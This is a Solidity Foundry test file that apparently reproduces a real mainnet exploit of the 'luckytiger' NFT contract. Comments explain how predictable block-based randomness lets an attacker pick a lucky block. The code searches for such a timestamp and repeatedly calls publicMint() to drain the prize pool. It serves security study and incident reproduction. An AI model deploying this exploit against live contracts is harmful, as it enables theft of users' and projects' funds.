// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.13;

import "forge-std/Test.sol";

/*
    Attacker: 0x3392c91403f09ad3b7e7243dbd4441436c7f443c
    Attack tx: https://etherscan.io/tx/0x804ff3801542bff435a5d733f4d8a93a535d73d0de0f843fd979756a7eab26af
    poc refers to: https://github.com/0xNezha/luckyHack
*/

// VULNERABILITY: Predictable Block-Dependent "Lucky" Mint Prize via Weak Randomness (Block Timestamp + Difficulty)
// 
// Root cause (see sources/luckytiger_9c87A5/luckytiger.sol for victim):
// - publicMint() [L1413] and freeMint() [L1395] call _getRandom() [L1436] AFTER taking payment/mint.
// - _getRandom(): uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))); uint256 rand = random%2; ... return lucky = (rand==1);
// - Global state: bool lucky; [L1346], mapping tokenId_luckys; [L1351]
// - On lucky: if(tokenId_luckys[tokenId]) { payable(msg.sender).send( (price*190)/100 ); ... } [L1423-1425]
//   (freeMint uses 95%). price=0.01 ETH [L1347]. Payout > input cost.
// - No access control, no per-block or per-user mint limit beyond totalSupply maxTotal=1000 [L1348].
// - ERC721L mint at [L1418] then RNG.
// 
// Why this is exploitable:
// 1. Predictable/attacker-controlled inputs: block.timestamp (settable by miner ~15s skew) and block.difficulty (known in PoW) allow OFF-CHAIN simulation of outcome for any ts.
//    See mirroring logic in this PoC: getRandom() [L31], and pre-check [L49].
// 2. Block-scoped constancy: keccak(diff, ts) is FIXED for all calls/txns in one block. A "lucky" block (rand%2==1) makes EVERY publicMint() in it award the 1.9x prize.
// 3. Economic asymmetry: 0.01 paid in, 0.019 received out (net +0.009/contract drain per mint) + NFT. Relies on contract's accumulated balance (from prior mints or addBonusPool()).
// 4. No secure randomness: no blockhash (post-tx), no commit-reveal, no Chainlink VRF, no private seed. Uses only public block vars.
// 5. Side effects in global: 'lucky' storage written every mint; tokenURI [L1445] also keys off tokenId_luckys for prize metadata.
// 6. .send + require can revert the mint on low gas, but here used for prize payout after state change (reentrancy not issue due to no fallback abuse here).
// 
// Impact: Complete drain of prize pool possible by minting only on favorable blocks. Real attack extracted significant ETH by exploiting that "lucky" outcome was both predictable and repeatable within block. 
// Contract balance (dealt in PoC setup) provides the over-refund. Users who mint on "unlucky" get nothing extra; attacker monopolizes the lucky ones.
// 
// EXPLOIT STEPS:
// 1. Fork at target block or use vm.warp to a timestamp where the PoC's getRandom() (mirrors contract) returns non-zero i.e. %2==1 [see L49-51 and FindTimestamp.sol].
// 2. Ensure sufficient balance on attacker + contract has ETH for payouts (vm.deal(nftAddress, 5 ether)).
// 3. In same block context (no roll), loop or batch calls to publicMint() sending exactly price=0.01 ether each [L52-59].
// 4. Each iteration: require passes, _safeMint, _getRandom() sets global lucky=true (same value), store flag, send 0.019 back via require(payable...).
// 5. All 10 (or N) mints succeed as "lucky" because block vars unchanged; balanceOf increases by 10; attacker nets ~0.09 ETH profit + NFTs.
// 6. If pre-check fails (unlucky block), revert early ("Not lucky") so only profitable path executes. In prod, attacker sends txs targeted at lucky blocks or uses multi-tx bundle in one block.
// 7. (Observed) Contract may have prior ETH from unlucky mints or owner addBonusPool, enabling the payout math (190% > 100% collected per mint).

interface NFT {
    function balanceOf(
        address _owner
    ) external view returns (uint256 balance);
}

contract luckyHack is Test {
    event Log(string);

    address owner = address(this);
    address nftAddress = 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8545", 15_403_430); // fork mainnet block number 15403430
        vm.deal(address(this), 3 ether);
        vm.deal(address(nftAddress), 5 ether);
    }

    function getRandom() public view returns (uint256) {
        // Mirrors EXACTLY the vulnerable computation in target's _getRandom() using same inputs.
        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {
            return 0;
        } else {
            return 1;
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function testExploit() public {
        // Search a lucky (difficulty, timestamp) pair. Anvil load-state may report
        // difficulty/prevrandao different from mainnet, so a fixed warp often fails offline.
        uint256 baseTs = block.timestamp;
        bool found;
        for (uint256 i = 0; i < 4096; i++) {
            vm.warp(baseTs + i);
            if (getRandom() == 1) {
                found = true;
                break;
            }
        }
        require(found, "Not lucky");
        console.log("getRandom", getRandom());

        uint256 amount = 10;

        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {
            revert("Not lucky");  // only proceed on "lucky" block (same condition as victim)
        }
        bytes memory data = abi.encodeWithSignature("publicMint()");

        for (uint256 i = 0; i < amount; ++i) {
            (bool status,) = address(nftAddress).call{value: 0.01 ether}(data);
            if (!status) {
                revert("error");
            } else {
                emit Log("success");
            }
        }

        console.log("NFT we got:", NFT(nftAddress).balanceOf(address(this)));
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
